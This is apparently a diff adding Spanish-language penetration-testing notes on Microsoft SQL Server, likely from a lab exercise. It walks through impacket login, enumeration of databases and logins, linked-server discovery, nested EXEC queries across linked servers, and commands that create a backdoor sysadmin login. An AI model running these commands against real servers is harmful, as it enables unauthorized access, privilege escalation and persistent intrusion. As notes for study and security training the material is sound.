@@ -1,0 +1,46 @@
+####MSSQL
+Para poder conectarnos a microsoft SQL debemos usar impacket
+mssqlclient.py <user>@<host>
+
+
+###Comandos basicos
+select user_name()
+#Saber nuestro usuario
+
+Select name from sysdatabases;
+#Devuelve lista de base de datos quee puede acceder el usr.
+
+Select table_name, table_schema from <db>.INFORMATION_SCHEMA.TABLES;
+#Devuelve el nombre de las tablas que contiene la base de datos
+
+Select * from <dbname>.<table_schema>.<table_name>
+#Muestra contenido de la tabla
+
+select name,sysadmin frrom syslogins;
+#check si el usr tiene privilegios de administador. 1 si, 0 para no
+
+Las bases de datos mssql pueden linkearse a una externa, esto puede verificarse en la sysserver table
+select srvname, isremote from sysservers;
+#El output devuelve 1 para un servidor remoto y 0 para un servidor linkeado
+
+###EXEC command
+EXEC ('select current_user') at [<srvname>]
+#EXEC sirve para ejecutar queries en linked servers. En srvname debe ir el nombre del servidor que salio en el comando anterior (select srvname, isremote from sysservers;)
+#Con este comando se esta consultando el usurio con el que se corren queries en el srv
+-> Con el output de que usuario corre queries en el servidor, podemos consultar si tiene privilegios de sysadmin nuevamente con el 2do comando de la lista
+
+EXEC ('select srvname, isremote from sysservers') at [<srvname>]
+#Se busca en el servidor linkeado si existen mas servidores linkeados
+-> Si existen mas servidores, se puede anidar el EXEC para poder consultar en este servidor
+
+EXEC (EXEC ('select suser_name()') at [<srvname>]) at [<srvname>]
+#Se anidan los exec para consultar en este nuevo servidor linkeado encontrado el usuario con el cual se ejecutan las queries.
+
+
+###Privilegios elevados
+En el caso de que el usuario consultado en el servidor linkeado o el servidor linkeado al linkeado sea ssyssadmin, se puede crear otro usuario con los mismo privilegios.
+
+EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
+EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
+#Con los dos comandos de arriba se esta creando un nuevo usuario llamado super con passw abc... y agregandolo a sysadmin
+-> Atencion! Hay 2 exec porque en el ejemplo se crea mediante queries en el servidor linkeado del linkeado
